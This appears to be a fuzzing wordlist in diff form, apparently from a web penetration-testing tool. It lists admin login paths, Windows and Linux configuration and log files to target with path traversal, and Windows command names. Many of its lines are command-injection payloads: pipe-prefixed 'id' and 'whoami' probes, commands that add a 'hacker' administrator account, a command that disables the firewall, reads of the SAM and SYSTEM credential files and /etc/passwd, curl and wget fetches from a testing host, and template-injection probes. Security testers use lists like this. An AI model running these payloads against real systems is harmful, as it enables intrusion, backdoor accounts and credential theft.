+admin/home.asp
+admin/home.aspx
+admin/login.asp
+admin/login.aspx
+admin/login.htm
+admin/login.html
+admin1.asp
+admin1.aspx
+admin1.htm
+admin1.html
+admin1/
+admin2.asp
+admin2.aspx
+admin2.html
+admin4_account/
+admin4_colon/
+adminLogin/
+admin_area.asp
+admin_area.aspx
+admin_area/
+admin_area/admin.asp
+admin_area/admin.aspx
+admin_area/login.asp
+admin_area/login.aspx
+admin_login.asp
+admin_login.aspx
+adminarea/
+admincontrol.asp
+admincontrol.aspx
+admincontrol/
+admincp/
+admincp/login.asp
+admincp/login.aspx
+administer/
+administr8.asp
+administr8.aspx
+administr8/
+administratie/
+administration.asp
+administration.aspx
+administration/
+administrator.asp
+administrator.aspx
+administrator/
+administrator/account.asp
+administrator/account.aspx
+administrator/login.asp
+administrator/login.aspx
+administratoraccounts/
+administratorlogin.asp
+administratorlogin.aspx
+administratorlogin/
+administrators.asp
+administrators.aspx
+administrators/
+administrivia/
+adminitem.asp
+adminitem.aspx
+adminitem/
+adminitems.asp
+adminitems.aspx
+adminitems/
+adminlogin.asp
+adminlogin.aspx
+adminpanel.asp
+adminpanel.aspx
+adminpanel/
+adminpro/
+admins.asp
+admins.aspx
+admins/
+adminsite/
+affiliate.asp
+affiliate.aspx
+append
+arp
+assoc
+at
+atmadm
+attrib
+auditpol
+auth.asp
+auth.aspx
+authadmin.asp
+authadmin.aspx
+authenticate.asp
+authenticate.aspx
+authentication.asp
+authentication.aspx
+authuser.asp
+authuser.aspx
+autochk
+autoconv
+autofmt
+autologin.asp
+autologin.aspx
+autologin/
+a|id|
+banneradmin/
+bb-admin/
+bb-admin/admin.asp
+bb-admin/admin.aspx
+bb-admin/admin.html
+bb-admin/login.asp
+bb-admin/login.aspx
+bbadmin/
+bcdboot
+bcdedit
+bdehdcfg
+bigadmin/
+bitsadmin
+blogindex/
+bootcfg
+break
+break_1
+c.microsoft.com
+c32web.exe/ChangeAdminPassword
+c:/MySQL/data/mysql-bin.index
+c:/MySQL/data/mysql-bin.log
+c:/MySQL/data/mysql.err
+c:/MySQL/data/mysql.log
+c:/MySQL/data/{IPDELHOST}.err
+c:/MySQL/my.cnf
+c:/MySQL/my.ini
+c:/NetServer/bin/stable/apache/php.ini
+c:/PHP/php.ini
+c:/PostgreSQL/log/pgadmin.log
+c:/Program Files/Apache Group/Apache/apache.conf
+c:/Program Files/Apache Group/Apache/apache2.conf
+c:/Program Files/Apache Group/Apache/conf/apache.conf
+c:/Program Files/Apache Group/Apache/conf/apache2.conf
+c:/Program Files/Apache Group/Apache/conf/httpd.conf
+c:/Program Files/Apache Group/Apache/logs/access.log
+c:/Program Files/Apache Group/Apache/logs/error.log
+c:/Program Files/Apache Group/Apache2/conf/apache.conf
+c:/Program Files/Apache Group/Apache2/conf/apache2.conf
+c:/Program Files/Apache Group/Apache2/conf/httpd.conf
+c:/Program Files/Apache Software Foundation/Apache2.2/conf/httpd.conf
+c:/Program Files/Apache Software Foundation/Apache2.2/logs/access.log
+c:/Program Files/Apache Software Foundation/Apache2.2/logs/error.log
+c:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.index
+c:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
+c:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
+c:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
+c:/Program Files/MySQL/MySQL Server 5.0/data/{IPDELHOST}.err
+c:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+c:/Program Files/MySQL/MySQL Server 5.0/my.ini
+c:/Program Files/MySQL/data/mysql-bin.index
+c:/Program Files/MySQL/data/mysql-bin.log
+c:/Program Files/MySQL/data/mysql.err
+c:/Program Files/MySQL/data/mysql.log
+c:/Program Files/MySQL/data/{IPDELHOST}.err
+c:/Program Files/MySQL/my.cnf
+c:/Program Files/MySQL/my.ini
+c:/Program Files/PostgreSQL/8.3/data/pg_hba.conf
+c:/Program Files/PostgreSQL/8.3/data/pg_ident.conf
+c:/Program Files/PostgreSQL/8.3/data/postgresql.conf
+c:/Program Files/PostgreSQL/8.4/data/pg_hba.conf
+c:/Program Files/PostgreSQL/8.4/data/pg_ident.conf
+c:/Program Files/PostgreSQL/8.4/data/postgresql.conf
+c:/Program Files/PostgreSQL/9.0/data/pg_hba.conf
+c:/Program Files/PostgreSQL/9.0/data/pg_ident.conf
+c:/Program Files/PostgreSQL/9.0/data/postgresql.conf
+c:/Program Files/PostgreSQL/9.1/data/pg_hba.conf
+c:/Program Files/PostgreSQL/9.1/data/pg_ident.conf
+c:/Program Files/PostgreSQL/9.1/data/postgresql.conf
+c:/Program Files/Vidalia Bundle/Polipo/polipo.conf
+c:/Program Files/xampp/apache/conf/apache.conf
+c:/Program Files/xampp/apache/conf/apache2.conf
+c:/Program Files/xampp/apache/conf/httpd.conf
+c:/WINDOWS/Debug/NetSetup.LOG
+c:/WINDOWS/ODBC.INI
+c:/WINDOWS/WindowsUpdate.log
+c:/WINDOWS/comsetup.log
+c:/WINDOWS/php.ini
+c:/WINDOWS/repair/setup.log
+c:/WINDOWS/setupact.log
+c:/WINDOWS/setupapi.log
+c:/WINDOWS/setuperr.log
+c:/WINDOWS/system32/Macromed/Flash/FlashInstall.log
+c:/WINDOWS/system32/Macromed/Flash/install.log
+c:/WINDOWS/system32/drivers/etc/hosts
+c:/WINDOWS/system32/drivers/etc/lmhosts.sam
+c:/WINDOWS/system32/drivers/etc/networks
+c:/WINDOWS/system32/drivers/etc/protocol
+c:/WINDOWS/system32/drivers/etc/services
+c:/WINDOWS/system32/logfiles/Firewall/pfirewall.log
+c:/WINDOWS/system32/logfiles/Firewall/pfirewall.log.old
+c:/WINDOWS/system32/logfiles/MSFTPSVC
+c:/WINDOWS/system32/logfiles/MSFTPSVC1
+c:/WINDOWS/system32/logfiles/MSFTPSVC2
+c:/WINDOWS/system32/logfiles/SMTPSVC
+c:/WINDOWS/system32/logfiles/SMTPSVC1
+c:/WINDOWS/system32/logfiles/SMTPSVC2
+c:/WINDOWS/system32/logfiles/SMTPSVC3
+c:/WINDOWS/system32/logfiles/SMTPSVC4
+c:/WINDOWS/system32/logfiles/SMTPSVC5
+c:/WINDOWS/system32/logfiles/W3SVC/inetsvn1.log
+c:/WINDOWS/system32/logfiles/W3SVC1/inetsvn1.log
+c:/WINDOWS/system32/logfiles/W3SVC2/inetsvn1.log
+c:/WINDOWS/system32/logfiles/W3SVC3/inetsvn1.log
+c:/WINDOWS/updspapi.log
+c:/WINDOWS/wmsetup.log
+c:/WINNT/php.ini
+c:/WINNT/system32/logfiles/Firewall/pfirewall.log
+c:/WINNT/system32/logfiles/Firewall/pfirewall.log.old
+c:/WINNT/system32/logfiles/MSFTPSVC
+c:/WINNT/system32/logfiles/MSFTPSVC1
+c:/WINNT/system32/logfiles/MSFTPSVC2
+c:/WINNT/system32/logfiles/SMTPSVC
+c:/WINNT/system32/logfiles/SMTPSVC1
+c:/WINNT/system32/logfiles/SMTPSVC2
+c:/WINNT/system32/logfiles/SMTPSVC3
+c:/WINNT/system32/logfiles/SMTPSVC4
+c:/WINNT/system32/logfiles/SMTPSVC5
+c:/WINNT/system32/logfiles/W3SVC/inetsvn1.log
+c:/WINNT/system32/logfiles/W3SVC1/inetsvn1.log
+c:/WINNT/system32/logfiles/W3SVC2/inetsvn1.log
+c:/WINNT/system32/logfiles/W3SVC3/inetsvn1.log
+c:/apache/php/php.ini
+c:/boot.ini
+c:/etc/postgresql/pg_hba.conf
+c:/etc/postgresql/postgresql.conf
+c:/home/bin/stable/apache/php.ini
+c:/home/postgres/data/PG_VERSION
+c:/home/postgres/data/pg_hba.conf
+c:/home/postgres/data/pg_ident.conf
+c:/home/postgres/data/postgresql.conf
+c:/home2/bin/stable/apache/php.ini
+c:/mysql/bin/my.ini
+c:/php/php.ini
+c:/php4/php.ini
+c:/php5/php.ini
+c:/usr/internet/pgsql/data/pg_hba.conf
+c:/usr/local/pgsql/bin/pg_passwd
+c:/usr/local/pgsql/data/passwd
+c:/usr/local/pgsql/data/pg_hba.conf
+c:/usr/local/pgsql/data/postgresql.conf
+c:/var/lib/pgsql/data/postgresql.conf
+c:/var/log/lighttpd/{DOMAIN}/access.log
+c:/var/nm2/postgresql.conf
+c:/var/postgresql/db/postgresql.conf
+c:/wamp/bin/apache/apache2.2.21/conf/httpd.conf
+c:/wamp/bin/apache/apache2.2.21/logs/access.log
+c:/wamp/bin/apache/apache2.2.21/logs/error.log
+c:/wamp/bin/apache/apache2.2.21/wampserver.conf
+c:/wamp/bin/apache/apache2.2.22/conf/httpd.conf
+c:/wamp/bin/apache/apache2.2.22/conf/wampserver.conf
+c:/wamp/bin/apache/apache2.2.22/logs/access.log
+c:/wamp/bin/apache/apache2.2.22/logs/error.log
+c:/wamp/bin/apache/apache2.2.22/wampserver.conf
+c:/wamp/bin/mysql/mysql5.5.16/data/mysql-bin.index
+c:/wamp/bin/mysql/mysql5.5.16/my.ini
+c:/wamp/bin/mysql/mysql5.5.16/wampserver.conf
+c:/wamp/bin/mysql/mysql5.5.24/data/mysql-bin.index
+c:/wamp/bin/mysql/mysql5.5.24/my.ini
+c:/wamp/bin/mysql/mysql5.5.24/wampserver.conf
+c:/wamp/bin/php/php5.3.8/php.ini
+c:/wamp/bin/php/php5.4.3/php.ini
+c:/wamp/logs/access.log
+c:/wamp/logs/apache_error.log
+c:/wamp/logs/genquery.log
+c:/wamp/logs/mysql.log
+c:/wamp/logs/slowquery.log
+c:/xampp/FileZillaFTP/FileZilla Server.xml
+c:/xampp/MercuryMail/mercury.ini
+c:/xampp/apache/bin/php.ini
+c:/xampp/apache/conf/httpd.conf
+c:/xampp/apache/logs/access.log
+c:/xampp/apache/logs/error.log
+c:/xampp/htdocs/aca.txt
+c:/xampp/htdocs/admin.php
+c:/xampp/htdocs/leer.txt
+c:/xampp/mysql/data/mysql-bin.index
+c:/xampp/mysql/data/mysql.err
+c:/xampp/mysql/data/{IPDELHOST}.err
+c:/xampp/php/php.ini
+c:/xampp/phpMyAdmin/config.inc.php
+c:/xampp/sendmail/sendmail.ini
+c:/xampp/sendmail/sendmail.log
+c:/xampp/webalizer/webalizer.conf
+c:\inetpub\wwwroot\
+c:\wamp\www
+c:\xampp\htdocs\
+cacls
+cacls_1
+cadmins/
+call
+cart32.exe
+cat /etc/hosts
+cat /etc/passwd
+ccp14admin/
+cd
+certreq_old
+certutil
+cfgwiz.exe
+cgi-bin/login.asp
+cgi-bin/login.aspx
+cgimail.exe
+cgitest.exe
+change
+chcp
+chdir
+chdir_1
+check.asp
+check.aspx
+checkadmin.asp
+checkadmin.aspx
+checklogin.asp
+checklogin.aspx
+checkuser.asp
+checkuser.aspx
+chglogon
+chgport
+chgusr
+chkdsk
+chkntfs
+choice
+cipher
+clip
+cls
+cmd
+cmd.exe?/c+dir
+cmd1.exe?/c+dir
+cmdkey
+cmsadmin.asp
+cmsadmin.aspx
+cmsadmin/
+cmstp
+color
+comp
+compact
+control.asp
+control.aspx
+control/
+controlpanel.asp
+controlpanel.aspx
+controlpanel/
+convert
+copy
+cp.asp
+cp.aspx
+cp/
+cpanel/
+cpanel_file/
+cprofile
+cscript
+curl https://crowdshield.com/.testing/rce_vuln.txt
+customer_login/
+date
+dbmlparser.exe
+dcgpofix
+defrag
+del
+dfsrmig
+diantz
+dir
+dir C:\
+dir C:\Documents and Settings\*
+dir C:\Users
+dir+c:\
+dir-login/
+directadmin/
+diskcomp
+diskcopy
+diskpart
+diskperf
+diskraid
+diskshadow
+dispdiag
+doskey
+download.microsoft.com
+download.windowsupdate.com
+driverquery
+eScan
+echo
+echo.bat
+echo.bat?&dir+c:\\
+edit
+endlocal
+erase
+eventcreate
+eventquery
+eventtriggers
+evntcmd
+exit
+exit_2
+expand
+explorer shell:command
+extract
+ezsqliteadmin/
+fc
+fileadmin.asp
+fileadmin.aspx
+fileadmin/
+filter
+find
+findstr
+finger
+flattemp
+for
+forfiles
+format
+formslogin/
+foxweb.dll
+foxweb.exe
+fpsrvadm.exe
+freedisk
+fsutil
+ftp
+ftype
+fveupdate
+get32.exe
+getmac
+gettype
+globes_admin/
+goto
+gpfixup
+gpresult
+gpupdate
+graftabl
+hello.bat?&dir+c:\\
+help
+helpctr
+hostname
+hpnst.exe?c=p+i=
+hpwebjetadmin/
+htimage.exe
+icacls
+if
+ifconfig
+imagemap.exe
+input2.bat?|dir
+instadmin/
+inuse
+ion-p.exe?page=c:\winnt\repair\sam
+ipconfig
+ipconfig /all
+ipseccmd
+ipsecpol
+ipxroute
+irc-macadmin/
+irftp
+isadmin.asp
+isadmin.aspx
+jetpack
+klist
+kpanel/
+ksetup
+ktmutil
+ktpass
+label
+letmein.asp
+letmein.aspx
+letmein/
+lodctr
+log-in.asp
+log-in.aspx
+log-in/
+log_in.asp
+log_in.aspx
+log_in/
+login-redirect/
+login-us/
+login.asp
+login.aspx
+login.htm
+login.html
+login/
+login1.asp
+login1.aspx
+login1/
+login_admin.asp
+login_admin.aspx
+login_admin/
+login_db/
+login_out.asp
+login_out.aspx
+login_out/
+login_user.asp
+login_user.aspx
+loginerror/
+loginflat/
+loginok/
+loginsave/
+loginsuper.asp
+loginsuper.aspx
+loginsuper/
+logman
+logo_sysadmin/
+logoff
+logout.asp
+logout.aspx
+logout/
+lpq
+lpr
+ls
+ls -l /
+ls -l /etc/
+ls -l /home/*
+ls -l /tmp
+ls -l /var/www/*
+ls -lh /etc/
+macadmin/
+macfile
+mailform.exe
+makecab
+manage-bde
+manage.asp
+manage.aspx
+manage/
+management.asp
+management.aspx
+management/
+manager.asp
+manager.aspx
+manager/
+manuallogin/
+mapadmin
+member.asp
+member.aspx
+member/
+memberadmin.asp
+memberadmin.aspx
+memberadmin/
+members.asp
+members.aspx
+members/
+memlogin/
+meta_login/
+minimal.exe
+mkdir
+mkilog.exe
+mklink
+mkplog.exe
+mmc
+mode
+modelsearch/login.asp
+modelsearch/login.aspx
+moderator.asp
+moderator.aspx
+moderator.html
+moderator.php
+moderator/
+moderator/admin.asp
+moderator/admin.aspx
+moderator/login.asp
+moderator/login.aspx
+modules/admin/
+more
+mount
+mountvol
+move
+mqbkup
+mqsvc
+mqtgsvc
+ms-availablenetworks:
+ms-settings-connectabledevices:devicediscovery
+ms-settings:batterysaver-settings
+ms-settings:batterysaver-usagedetails
+ms-settings:cortana-language
+ms-settings:delivery-optimization
+ms-settings:mobile-devices-addphone
+ms-settings:network-wifisettings
+ms-settings:nightlight
+ms-settings:optionalfeatures
+ms-settings:savelocations
+ms-settings:signinoptions-launchfaceenrollment
+ms-settings:storagepolicies
+ms-settings:windowsupdate-action
+ms-settings:windowsupdate-history
+ms-settings:windowsupdate-options
+ms-settings:windowsupdate-restartoptions
+msdt
+msg
+msiexec
+msinfo32
+mstsc
+myadmin/
+nProtect
+navSiteAdmin/
+nbtstat
+net
+net localgroup Administrators hacker /ADD
+net user hacker Password1 /ADD
+net view
+netcfg
+netsh
+netsh firewall set opmode disable
+netstat
+netstat -an
+newsadmin/
+nfsadmin
+nfsshare
+nfsstat
+nslookup
+ntbackup
+ntcmdprompt
+ntrights
+ntsd
+ntservicepack.microsoft.com
+openfiles
+openvpnadmin/
+pagefileconfig
+pages/admin/
+pages/admin/admin-login.asp
+pages/admin/admin-login.aspx
+panel-administracion/
+panel-administracion/login.asp
+panel-administracion/login.aspx
+panel.asp
+panel.aspx
+panel/
+path
+pathping
+pause
+pbadmin
+pentnt
+perfmon
+perl.exe
+perl.exe?-v
+permcopy
+perms
+pgadmin/
+php://input
+phpSQLiteAdmin/
+phpldapadmin/
+phpmyadmin/
+phppgadmin/
+ping
+platz_login/
+pnpunattend
+pnputil
+popd
+post16.exe
+power_user/
+powershell.exe
+ppdscgi.exe
+print
+prncnfg
+prndrvr
+prnjobs
+prnmngr
+prnport
+prnqctl
+processlogin.asp
+processlogin.aspx
+project-admins/
+prompt
+pubprn
+pureadmin/
+pushd
+pwd
+qappsrv
+qprocess
+query
+quser
+qwinsta
+radmind-1/
+radmind/
+rasdial
+rcLogin/
+rcp
+rd
+rdpsign
+recover
+reg
+regsvr32
+relog
+relogin.asp
+relogin.aspx
+relogin.htm
+relogin.html
+rem
+ren
+rename
+repair-bde
+replace
+reset session
+rexec
+rguest.exe
+rightfax/fuwww.dll/?
+risetup
+rmdir
+robocopy
+root/
+route
+rpcinfo
+rpcping
+rsh
+rsm
+runas
+rundll32
+rwinsta
+sc
+schtasks
+scripts/slxweb.dll/getfile?type=Library&file=[invalid filename]
+secedit
+secret/
+secrets/
+secure/
+security/
+sensepost.exe?/c+dir
+server_admin_small/
+serverceipoptin
+serverweroptin
+set
+set_1
+setlocal
+setx
+sfc
+shadow
+shell:AddNewProgramsFolder	Control Panel\All Control Panel Items\Get Programs
+shell:AppUpdatesFolder	Installed Updates
+shell:AppsFolder	Applications
+shell:ChangeRemoveProgramsFolder	Control Panel\All Control Panel Items\Programs and Features
+shell:ConflictFolder	Control Panel\All Control Panel Items\Sync Center\Conflicts
+shell:ConnectionsFolder	Control Panel\All Control Panel Items\Network Connections
+shell:ControlPanelFolder	Control Panel\All Control Panel Items
+shell:Games	Games
+shell:HomeGroupFolder	Homegroup
+shell:InternetFolder	Internet Explorer
+shell:Libraries	Libraries
+shell:MusicLibrary	Libraries\Music
+shell:MyComputerFolder	This PC
+shell:NetworkPlacesFolder	Network
+shell:OneDrive	OneDrive
+shell:PicturesLibrary	Libraries\Pictures
+shell:PrintersFolder	All Control Panel Items\Printers
+shell:RecordedTVLibrary	Libraries\Recorded TV
+shell:RecycleBinFolder	Recycle Bin
+shell:SearchHomeFolder	search-ms:
+shell:StartMenuAllPrograms	StartMenuAllPrograms
+shell:SyncCenterFolder	Control Panel\All Control Panel Items\Sync Center
+shell:SyncResultsFolder	Control Panel\All Control Panel Items\Sync Center\Sync Results
+shell:SyncSetupFolder	Control Panel\All Control Panel Items\Sync Center\Sync Setup
+shell:ThisPCDesktopFolder	Desktop
+shell:UsersLibrariesFolder	Libraries
+shell:VideosLibrary	Libraries\Videos
+shell:desktop	Desktop
+shell:documentsLibrary	Libraries\Documents
+shift
+showacls
+showgrps
+showlogin/
+showmbrs
+showmount
+shtml.dll
+shutdown
+sign-in.asp
+sign-in.aspx
+sign-in/
+sign_in.asp
+sign_in.aspx
+sign_in/
+signin.asp
+signin.aspx
+signin/
+simpleLogin/
+siteadmin.asp
+siteadmin.aspx
+siteadmin/
+sleep 1
+sleep 10
+sleep 5
+smblogin/
+somedir \x1a whoami
+sort
+sql-admin/
+ss_vms_admin_sm/
+sshadmin/
+staradmin/
+start
+sub-login/
+subinacl
+subst
+super.asp
+super.aspx
+super1.asp
+super1.aspx
+super1/
+super_index.asp
+super_index.aspx
+super_login.asp
+super_login.aspx
+superman.asp
+superman.aspx
+superman/
+supermanager.asp
+supermanager.aspx
+superuser.asp
+superuser.aspx
+superuser/
+supervise/
+supervise/Login.asp
+supervise/Login.aspx
+supervisor/
+support_login/
+sxstrace
+sys-admin/
+sysadm.asp
+sysadm.aspx
+sysadm/
+sysadmin.asp
+sysadmin.aspx
+sysadmins/
+sysinfo
+sysocmgr
+system-administration/
+system_administration/
+systeminfo
+takeown
+tapicfg
+taskkill
+tasklist
+tcmsetup
+telnet
+test*; ls -lhtR /var/www/
+test-cgi.bat
+test.stats.update.microsoft.com
+testcgi.exe
+texis.exe/junk
+tftp
+time
+timeout_1
+title
+title_1
+tlntadmn
+tracerpt
+tracerpt_1
+tracert
+tree
+tscon
+tsdiscon
+tsecimp_1
+tskill
+tsprof
+type
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+type C:\Windows\repair\SAM
+type C:\Windows\repair\SYSTEM
+typeperf
+typo3/
+tzutil
+uname
+uname -a
+unlodctr
+unlodctr_1
+update.microsoft.com
+ur-admin.asp
+ur-admin.aspx
+ur-admin/
+user.asp
+user.aspx
+user/
+useradmin/
+userlogin.asp
+userlogin.aspx
+users.asp
+users.aspx
+users/
+usr/
+utility_login/
+uvpanel/
+vadmind/
+ver
+verifier
+verify
+verify_1
+visadmin.exe
+visitor.exe
+vmailadmin/
+vol
+vorod.asp
+vorod.aspx
+vorod/
+vorud.asp
+vorud.aspx
+vorud/
+vssadmin
+w32tm
+waitfor
+wbadmin
+wconsole.dll
+wdsutil
+webadmin.asp
+webadmin.aspx
+webadmin/
+webbbs.exe
+webmaster.asp
+webmaster.aspx
+webmaster/
+webplus.exe?about
+wecutil
+wevtutil
+wget https://crowdshield.com/.testing/rce_vuln.txt
+wguest.exe
+where_1
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+whoami
+windmail.exe
+windowsdefender:
+windowsupdate.com
+windowsupdate.microsoft.com
+winnt
+winnt32
+winpop
+winrs
+wizmysqladmin/
+wmic
+word " c:\\where\\ || dir || '
+wp-admin/
+wp-login.aspx
+wp-login.php
+wp-login/
+xcacls
+xcopy
+xlogin/
+yonetici.asp
+yonetici.aspx
+yonetici.html
+yonetim.asp
+yonetim.aspx
+yonetim.html
+{1} + {1}
+{{4+4}}
+{{4+8}}
+{{paths}}
+{{person.name}}
+{{person.secret}}
+|
+| curl http://crowdshield.com/.testing/rce.txt
+| dir
+| dir C:\
+| dir C:\Documents and Settings\*
+| dir C:\Users
+| id
+| ifconfig
+| ipconfig /all
+| ls -l /
+| ls -l /etc/
+| ls -l /home/*
+| ls -l /tmp
+| ls -l /var/www/*
+| ls -laR /etc
+| ls -laR /var/www
+| net localgroup Administrators hacker /ADD
+| net user hacker Password1 /ADD
+| net view
+| netsh firewall set opmode disable
+| netstat -an
+| pwd
+| sleep 1
+| sleep 10
+| sleep 15
+| sleep 5
+| sysinfo
+| systeminfo
+| type C:\WINNT\repair\SAM
+| type C:\Windows\repair\SAM
+| type C:\Windows\repair\SYSTEM
+| uname -a
+| wget http://crowdshield.com/.testing/rce.txt
+| whoami
+|/usr/bin/id
+|id
+||
+|| sleep 10
+|| sleep 15
+||+dir|c:\
+ÿþC:\Windows\System32\wiawow64.exe
